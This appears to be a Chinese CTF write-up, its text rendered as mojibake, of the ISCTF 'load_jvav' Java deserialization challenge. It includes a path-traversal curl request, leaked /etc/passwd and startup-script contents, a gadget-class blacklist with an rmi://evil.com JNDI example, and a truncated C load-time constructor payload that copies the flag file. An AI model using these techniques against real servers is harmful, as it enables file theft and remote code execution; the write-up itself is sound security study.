<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <title>ç™½ç™½æ¯›æ¯›</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/_custom.css">
<meta name="generator" content="Hexo 8.1.1"></head>
<body class="bg-post">

<div class="sidebar">
    <div class="header-info">
        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
        <div class="site-author">ç™½ç™½æ¯›æ¯›</div>
    </div>
    <nav class="nav">
        <a href="/">é¦–é¡µ</a>
        <a href="/categories">åˆ†ç±»</a>
        <a href="/archives">æ‰€æœ‰</a>
    </nav>
    <div class="contact-section">
        <p>If you want find me:</p>
        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
    </div>
</div>

<div class="content-area">
    
<div style="height: 60px;"></div>
<div class="content-wrapper">
    <article class="post-article">
        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">ISCTF-load-jvav</h1>
        
        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
            <span>ğŸ“… å‘å¸ƒ: 2025-12-08</span>
            <span style="margin: 0 15px;">|</span>
            <span style="color: #007bff; font-weight: bold;">ğŸ“ æ›´æ–°: 2025-12-29</span>
            
            
             <span style="margin: 0 15px;">|</span>
             ğŸ“‚ å­¦ä¹ 
            
        </div>
        
        <div class="article-content">
            <p>æ²¡æœ‰åƒè¿‡ä»€ä¹ˆå«æ¯«æ— å¤´ç»ªçš„å¯ä»¥è¿‡æ¥æ‰“ä¸€ä¸‹ã€‚\</p>
<p>è¿™ä¸€é¢˜æ˜¯æˆ‘è§‰å¾—æ—¢ç„¶é‚£é¢˜javaååºåˆ—åšäº†ï¼Œé‚£ä¹Ÿæ¥çœ‹çœ‹è¿™ä¸ªã€‚</p>
<h1 id="load-jvav"><a href="#load-jvav" class="headerlink" title="#load_jvav"></a>#load_jvav</h1><p><img src="/images/QQ20251211-193325.png" alt="alt text"></p>
<p><img src="/images/QQ20251210-205652.png" alt="alt text"></p>
<p>çœ‹ç€ååˆ†äººç•œæ— å®³ï¼Œåˆ°æ—¶å€™ï¼Œä½ å°±ä¼šç‹ ç‹ è€å®äº†ã€‚</p>
<p>é¢˜ç›®å†™ç€javaï¼Œæ‰€ä»¥å¤§æ¦‚ç‡æ˜¯javaçš„åç«¯ï¼Œé¢˜ç›®æ˜¯æ²¡æœ‰ç»™æºç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æš‚æ—¶æ— æ³•ç¡®å®šè¿™é¢˜çš„æ ·å­ï¼Œæˆ‘ç›´æ¥ç‹ ç‹ æ‰«äº†ä¸€ä¸‹ã€‚</p>
<p>æœ‰ä¸€ä¸ªadminã€‚</p>
<p><img src="/images/QQ20251210-210004.png" alt="alt text"></p>
<p>è®¿é—®ä¸€ä¸‹ï¼Œå°±æœ‰äº†ä¸€ä¸ªï¼Œâ€dataâ€: â€œå±…ç„¶ä½ æ‡‚å¾—è®¿é—®adminç›®å½•ï¼Œé‚£ä¹ˆå°±å‘Šè¯‰ä½ ä¸ªç§˜å¯†:file:&#x2F;app&#x2F;ezJava.jar!&#x2F;BOOT-INF&#x2F;classes!&#x2F;â€œï¼Œä¸€ä¸ªå°æé†’ã€‚</p>
<p>çœ‹åˆ°è¿™ä¸ªï¼Œå…¶å®æˆ‘ä»¬å°±å¤§è‡´çŸ¥é“æºç çš„ä½ç½®äº†ï¼Œæˆ‘è™½ç„¶ä¸çŸ¥é“ï¼Œè¦æ€ä¹ˆåšï¼Œæˆ‘ç›´æ¥çˆ†ç ´äº†ã€‚</p>
<p>å„ç§çˆ†ç ´ï¼Œç›´æ¥æ‹¿ä¸‹äº†æºç ï¼Œ</p>
<blockquote>
<p>curl â€œ<a target="_blank" rel="noopener" href="http://challenge.bluesharkinfo.com:24416/api/FileRead?filename=../../../app/ezjava_src.zip">http://challenge.bluesharkinfo.com:24416/api/FileRead?filename=../../../app/ezjava_src.zip</a>â€œ</p>
</blockquote>
<p>è¿˜æœ‰ï¼Œæˆ‘ä»¬è¿˜å¾—åˆ°äº†è®¸å¤šä¿¡æ¯ã€‚</p>
<p><img src="/images/QQ20251210-210723.png" alt="alt text"></p>
<p>è§£ç å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/openjdk-11</span><br><span class="line">JAVA_VERSION=11.0.13</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯åå°javaçš„ç‰ˆæœ¬ã€‚</p>
<p><img src="/images/QQ20251210-211155.png" alt="alt text"></p>
<p>Dockerå®¹å™¨ç¯å¢ƒå†…å¯åŠ¨çš„é¶æœºï¼Œç„¶åè¿›ç¨‹åœ¨è·Ÿcgroupé‡Œé¢ã€‚</p>
<p><img src="/images/QQ20251210-211449.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /app/ezJava.jar</span><br></pre></td></tr></table></figure>

<p>ç›®å‰çš„è¿›ç¨‹ã€‚</p>
<p><img src="/images/QQ20251210-211604.png" alt="alt text"></p>
<p>è§£ç å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$DASFLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$DASFLAG&quot;</span><br><span class="line">    export DASFLAG=no_FLAG</span><br><span class="line">    DASFLAG=no_FLAG</span><br><span class="line">elif [ -n &quot;$FLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$FLAG&quot;</span><br><span class="line">    export FLAG=no_FLAG</span><br><span class="line">    FLAG=no_FLAG</span><br><span class="line">elif [ -n &quot;$GZCTF_FLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;</span><br><span class="line">    export GZCTF_FLAG=no_FLAG</span><br><span class="line">    GZCTF_FLAG=no_FLAG</span><br><span class="line">else</span><br><span class="line">    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">mkdir -p /flag</span><br><span class="line">echo &quot;$INSERT_FLAG&quot; &gt; /flag/flag.flag</span><br><span class="line">chmod 744 /flag/flag.flag</span><br><span class="line"></span><br><span class="line">exec java \</span><br><span class="line">  -Dspring.autoconfigure.exclude=org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration \</span><br><span class="line">  -jar /app/ezJava.jar</span><br></pre></td></tr></table></figure>

<p>åº”ç”¨å¯åŠ¨æ—¶ä»ç¯å¢ƒå˜é‡è¯»å–flagï¼Œflagè¢«å†™å…¥æ–‡ä»¶ï¼š<code>/flag/flag.flag</code>ï¼Œå†™å…¥åç«‹å³è®¾ç½®ä¸º <code>no_FLAG</code>ï¼Œç¯å¢ƒå˜é‡è¢«æ¸…é™¤ã€‚</p>
<p><img src="/images/QQ20251210-212025.png" alt="alt text"></p>
<p>æ ¹ç›®å½•è¯»å–ï¼Œçœ‹è§ä¸ªflagã€‚</p>
<p><img src="/images/QQ20251210-212115.png" alt="alt text"></p>
<p>appå†…æ–‡ä»¶è¯»å–ï¼Œçœ‹è§æºä»£ç äº†ã€‚</p>
<p><img src="/images/QQ20251210-212153.png" alt="alt text"></p>
<p>å°è¯•ç›´æ¥è¯»å–flagï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p>
<p><img src="/images/QQ20251210-212313.png" alt="alt text"></p>
<p>è§£ç å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>å†éç›®å½•å¯ä»¥ç”¨ã€‚</p>
<p><img src="/images/QQ20251211-184420.png" alt="alt text"></p>
<p>ç›´æ¥è¯»å–flagä½ç½®ï¼Œå¤±è´¥ã€‚</p>
<p><img src="/images/QQ20251211-184530.png" alt="alt text"></p>
<p>ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œå‘ç°æˆåŠŸäº†ã€‚</p>
<hr>
<p>è¿™è¾¹å…¶å®æ‹¿åˆ°æºç åï¼Œå°±èƒ½åšäº†ï¼Œåªæ˜¯æ¯”èµ›å½“æ—¶çœ‹ä¸æ‡‚javaé‡Œé¢çš„æ¼æ´ï¼Œæ‰€ä»¥æ²¡åšå‡ºæ¥ï¼Œäº‹ä¸å®œè¿Ÿï¼Œç›´æ¥ä¸Šæ¼æ´ã€‚</p>
<p><img src="/images/QQ20251211-184801.png" alt="alt text"></p>
<p>è¿™è¾¹å…¶å®æœ€ä¸»è¦çš„æ˜¯è¿™ä¸€æ®µï¼Œç ”ç©¶ä¸€ä¸‹ï¼Œå…¶å®å¯ä»¥å‘ç°ï¼Œå¦‚æœå½“ä¸Šä¼ æ–‡ä»¶çš„åç¼€åŒ…å« <code>.ref</code> æ—¶ï¼Œåç«¯ä¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œ Base64 è§£ç å¹¶ååºåˆ—åŒ–ã€‚</p>
<p>åˆæ˜¯ååºåˆ—åŒ–ï¼Œåˆè¦æ‰¾é“¾ã€‚</p>
<p><img src="/images/QQ20251211-184943.png" alt="alt text"></p>
<p>è¿˜æ€ªå¥½çš„ï¼Œyoufindthisã€‚</p>
<p><img src="/images/QQ20251211-185217.png" alt="alt text"></p>
<p>çœ‹è¿™è¾¹ï¼Œ<code>readObject</code>ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„POFPæ–¹æ³•ã€‚</p>
<p><img src="/images/QQ20251211-185510.png" alt="alt text"></p>
<p>ç´§æ¥ç€è¿™è¾¹<code>method.invoke(input, args)</code> å…è®¸ç¨‹åºæ‰§è¡Œä»»ä½•å¯¹è±¡ (<code>input</code>) çš„ä»»ä½•æ–¹æ³• (<code>method</code>)ï¼Œå¹¶ä¼ å…¥ä»»ä½•å‚æ•° (<code>args</code>)ã€‚</p>
<p>å…¶å®é¢˜ç›®ä¹Ÿæ˜¯æœ‰ä¸€ä¸ªé»‘åå•çš„ï¼Œä½†æ˜¯å¦‚æœæ²¡æ³¨æ„ï¼Œç›´æ¥ç”¨è¿™ä¸ªï¼Œä¹Ÿæ²¡äº‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package com.example.utile;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class safeSer extends ObjectInputStream &#123;</span><br><span class="line"></span><br><span class="line">    private static final Set&lt;String&gt; BLACKLIST = new HashSet&lt;&gt;(Arrays.asList(</span><br><span class="line">            // Apache Commons Collections ç›¸å…³ç±»</span><br><span class="line">            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.ConstantTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.DefaultedMap&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.LazyMap&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.TransformedMap&quot;,</span><br><span class="line"></span><br><span class="line">            // Commons Collections4</span><br><span class="line">            &quot;org.apache.commons.collections4.Transformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.ChainedTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.ConstantTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,</span><br><span class="line"></span><br><span class="line">            // å…¶ä»–å¸¸è§çš„å±é™©ç±»</span><br><span class="line"></span><br><span class="line">            &quot;javax.management.BadAttributeValueExpException&quot;,</span><br><span class="line">            &quot;java.rmi.server.UnicastRemoteObject&quot;,</span><br><span class="line">            &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">            &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            //è§£å†³ä¸€äº›éé¢„æœŸé—®é¢˜</span><br><span class="line">            &quot;springboot&quot;,</span><br><span class="line">            &quot;springframework&quot;,</span><br><span class="line">            &quot;com.fasterxml&quot;,</span><br><span class="line">            &quot;jackson&quot;,</span><br><span class="line">            &quot;org.yaml&quot;,</span><br><span class="line">            &quot;org.thymeleaf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    public safeSer(InputStream in) throws IOException &#123;</span><br><span class="line">        super(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        String className = desc.getName();</span><br><span class="line"></span><br><span class="line">        // æ£€æŸ¥ç±»æ˜¯å¦åœ¨é»‘åå•ä¸­</span><br><span class="line">        if (isMaliciousClass(className)) &#123;</span><br><span class="line">            throw new SecurityException(&quot;æ£€æµ‹åˆ°æ½œåœ¨çš„ååºåˆ—åŒ–æ”»å‡»ï¼Œç±»: &quot; + className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean isMaliciousClass(String className) &#123;</span><br><span class="line">        // ç›´æ¥åŒ¹é…é»‘åå•</span><br><span class="line">//        if (BLACKLIST.contains(className)) &#123;</span><br><span class="line">//            return true;</span><br><span class="line">//        &#125;</span><br><span class="line">        for (String blacklist : BLACKLIST) &#123;</span><br><span class="line">            if (className.contains(blacklist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // æ£€æŸ¥åŒ…åå‰ç¼€ï¼ˆæ›´ä¸¥æ ¼çš„æ£€æµ‹ï¼‰</span><br><span class="line">        if (className.startsWith(&quot;org.apache.commons.collections.functors.&quot;) ||</span><br><span class="line">                className.startsWith(&quot;org.apache.commons.collections4.functors.&quot;) ||</span><br><span class="line">                className.startsWith(&quot;org.apache.commons.collections.&quot;) &amp;&amp;</span><br><span class="line">                        className.contains(&quot;Transformer&quot;)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>é»‘åå•ä½œç”¨ï¼š</strong></p>
<ol>
<li>ç¦æ­¢äº† Apache Commons Collections (CC é“¾)</li>
</ol>
<p>è¿™æ˜¯ Java ååºåˆ—åŒ–æœ€ç»å…¸ã€æœ€æ™®éçš„åˆ©ç”¨é“¾ï¼ˆysoserial ä¸­çš„ CC1 - CC7 ç­‰ï¼‰ã€‚</p>
<ul>
<li><strong>æ ¸å¿ƒæ‰§è¡Œç±»ï¼š</strong><ul>
<li><code>Transformer</code>, <code>ChainedTransformer</code>, <code>ConstantTransformer</code>, <code>InvokerTransformer</code>, <code>InstantiateTransformer</code>ã€‚</li>
<li><strong>ä½œç”¨ï¼š</strong> è¿™äº›ç±»å…è®¸é€šè¿‡åå°„é“¾å¼è°ƒç”¨ä»»æ„æ–¹æ³•ï¼ˆé€šå¸¸æ˜¯ <code>Runtime.exec</code>ï¼‰ï¼Œæ˜¯å®ç° RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰çš„å¼•æ“ã€‚</li>
</ul>
</li>
<li><strong>è§¦å‘ç±»&#x2F;è¾…åŠ©ç±»ï¼š</strong><ul>
<li><code>DefaultedMap</code>, <code>LazyMap</code>, <code>TransformedMap</code>ã€‚</li>
<li><strong>ä½œç”¨ï¼š</strong> è¿™äº› Map ç±»é€šå¸¸ç”¨äºè£…é¥°å™¨æ¨¡å¼ï¼Œå½“æ”»å‡»è€…è®¿é—® Map å…ƒç´ æˆ–ä¿®æ”¹ Map æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å†…éƒ¨çš„ Transformer é“¾ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li>ç¦æ­¢äº†é«˜å±çš„ JDK åŸç”ŸåŠå¸¸ç”¨åº“åˆ©ç”¨ç‚¹</li>
</ol>
<p>é™¤äº† CC é“¾ï¼Œä»£ç è¿˜å°é”äº†å‡ ä¸ªå†å²ä¸Šéå¸¸è‘—åçš„ååºåˆ—åŒ– Sinkï¼ˆæ‰§è¡Œç‚¹ï¼‰å’Œ Sourceï¼ˆå…¥å£ç‚¹ï¼‰ã€‚</p>
<ul>
<li><strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></strong><ul>
<li><strong>æ”»å‡»æ–¹å¼ï¼š</strong> è¿™æ˜¯å¾ˆå¤šåˆ©ç”¨é“¾ï¼ˆå¦‚ CC2, CC3, CC4, CommonsBeanutils1 ç­‰ï¼‰çš„æœ€ç»ˆæ‰§è¡Œç‚¹ã€‚</li>
<li><strong>åŸç†ï¼š</strong> å®ƒå…è®¸æ”»å‡»è€…ä¼ å…¥æ¶æ„çš„å­—èŠ‚ç ï¼Œå¹¶åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­é€šè¿‡ <code>defineClass</code> åŠ¨æ€åŠ è½½è¯¥å­—èŠ‚ç ï¼Œç›´æ¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</li>
</ul>
</li>
<li><strong><code>com.sun.rowset.JdbcRowSetImpl</code></strong><ul>
<li><strong>æ”»å‡»æ–¹å¼ï¼š</strong> <strong>JNDI æ³¨å…¥</strong>ã€‚</li>
<li><strong>åŸç†ï¼š</strong> æ”»å‡»è€…å¯ä»¥è®¾ç½® <code>dataSourceName</code> ä¸ºæ¶æ„çš„ RMI&#x2F;LDAP åœ°å€ï¼ˆå¦‚ <code>rmi://evil.com/exploit</code>ï¼‰ã€‚å½“è¯¥å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼ˆæˆ–è§¦å‘ <code>setAutoCommit</code>ï¼‰æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå»è¿æ¥æ¶æ„æœåŠ¡å™¨å¹¶ä¸‹è½½æ‰§è¡Œæ¶æ„å¯¹è±¡ã€‚</li>
</ul>
</li>
<li><strong><code>javax.management.BadAttributeValueExpException</code></strong><ul>
<li><strong>æ”»å‡»æ–¹å¼ï¼š</strong> è§¦å‘ç‚¹ï¼ˆTriggerï¼‰ã€‚</li>
<li><strong>åŸç†ï¼š</strong> å®ƒçš„ <code>readObject</code> æ–¹æ³•ä¼šè§¦å‘å†…éƒ¨å¯¹è±¡çš„ <code>toString()</code> æ–¹æ³•ã€‚è¿™é€šå¸¸è¢«ç”¨æ¥è¿æ¥é‚£äº›é  <code>toString</code> è§¦å‘çš„åˆ©ç”¨é“¾ï¼ˆä¾‹å¦‚ CC5ï¼‰ã€‚</li>
</ul>
</li>
<li><strong><code>java.rmi.server.UnicastRemoteObject</code></strong><ul>
<li><strong>æ”»å‡»æ–¹å¼ï¼š</strong> JRMP æ”»å‡»ã€‚</li>
<li><strong>åŸç†ï¼š</strong> ç”¨äºå»ºç«‹æ¶æ„çš„ RMI è¿æ¥ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨åå‘è¿æ¥æ”»å‡»è€…çš„ JRMP ç›‘å¬ç«¯å£ã€‚</li>
</ul>
</li>
</ul>
<ol start="3">
<li>â€œæš´åŠ›â€å°ç¦äº†å¸¸è§ Web æ¡†æ¶å’Œåº“</li>
</ol>
<p>è¿™ä¸€éƒ¨åˆ†ï¼ˆä»£ç æ³¨é‡Šæ ‡æ³¨ä¸ºâ€œè§£å†³ä¸€äº›éé¢„æœŸé—®é¢˜â€ï¼‰é‡‡ç”¨äº†ä¸€ç§éå¸¸æ¿€è¿›çš„ç­–ç•¥ã€‚ç”±äº <code>isMaliciousClass</code> ä½¿ç”¨çš„æ˜¯ <code>className.contains(blacklist)</code>ï¼ˆåŒ…å«åŒ¹é…ï¼‰ï¼Œåªè¦ç±»åé‡Œå¸¦æœ‰ä»¥ä¸‹å­—ç¬¦ä¸²ï¼Œå°±ä¼šè¢«æ‹¦æˆªã€‚</p>
<ul>
<li><strong><code>springboot</code>, <code>springframework</code></strong><ul>
<li><strong>ç›®çš„ï¼š</strong> ç›´æ¥å°æ€æ‰€æœ‰ Spring æ¡†æ¶ç›¸å…³çš„ç±»ã€‚é˜²æ­¢åˆ©ç”¨ Spring å†…éƒ¨çš„ Gadgetï¼ˆå¦‚ <code>POJONode</code> ç­‰ï¼‰æˆ– Spring çš„ JNDI åˆ©ç”¨ç‚¹ã€‚</li>
</ul>
</li>
<li><strong><code>com.fasterxml</code>, <code>jackson</code></strong><ul>
<li><strong>ç›®çš„ï¼š</strong> å°æ€ Jackson JSON åº“ã€‚è™½ç„¶ Jackson ä¸»è¦å¤„ç† JSONï¼Œä½†å…¶æŸäº›ç±»åœ¨åŸç”Ÿåºåˆ—åŒ–ä¸­ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ï¼Œæˆ–è€…é…åˆå¤šæ€ååºåˆ—åŒ–è¿›è¡Œæ”»å‡»ã€‚</li>
</ul>
</li>
<li><strong><code>org.yaml</code></strong><ul>
<li><strong>ç›®çš„ï¼š</strong> å°æ€ SnakeYAML ç›¸å…³ç±»ã€‚</li>
</ul>
</li>
<li><strong><code>org.thymeleaf</code></strong><ul>
<li><strong>ç›®çš„ï¼š</strong> å°æ€ Thymeleaf æ¨¡æ¿å¼•æ“ç›¸å…³ç±»ã€‚</li>
</ul>
</li>
</ul>
<p>ä»¥ä¸Šå†…å®¹å‡ä¸ºaiè§£æï¼Œæˆ‘æ˜¯æ²¡æœ‰çœ‹æ‡‚çš„ï¼Œä¸è¿‡å¯ä»¥é•¿é•¿è§è¯†ï¼Œæœ‰ç‚¹å°è±¡ã€‚</p>
<hr>
<p>ç”±äºæœåŠ¡å™¨å™¨è®¾ç½®ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•ç›´æ¥è®¿é—®åˆ°flagæ‰€åœ¨çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬çš„æƒ³æ³•æ˜¯å°†flagæ¬å‡ºæ¥ï¼Œæ”¾åœ¨æˆ‘ä»¬å¯ä»¥é˜…è¯»çš„æ–‡ä»¶ä¸Šã€‚</p>
<p>å› ä¸º C è¯­è¨€èƒ½é€šè¿‡ <code>constructor</code> å®ç°â€œåŠ è½½å³è¿è¡Œâ€ï¼Œè€Œä¸” C è¯­è¨€ç¼–å†™çš„æ–‡ä»¶åœ¨ç¼–è¯‘åæ­£å¥½æ˜¯ç»™æœºå™¨é˜…è¯»çš„äºŒè¿›åˆ¶ä»£ç ã€‚</p>
<p>ç”±æ­¤ï¼Œæˆ‘ä»¬åˆæ­¥å†™å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// æ„é€ å‡½æ•°ï¼šåº“åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œ</span><br><span class="line">void __attribute__ ((constructor)) setup(void) &#123;</span><br><span class="line">    FILE *src_flag, *dst_file;</span><br><span class="line">    char ch;</span><br><span class="line"></span><br><span class="line">    // 1. æ‰“å¼€æºæ–‡ä»¶ (å°è¯•æ ‡å‡†è·¯å¾„)</span><br><span class="line">    src_flag = fopen(&quot;/flag/flag.flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (src_flag == NULL) &#123;</span><br><span class="line">        // å¦‚æœå¤±è´¥ï¼Œå°è¯•æ ¹ç›®å½•good.txt</span><br><span class="line">        src_flag = fopen(&quot;/flag&quot;, &quot;r&quot;);</span><br><span class="line">    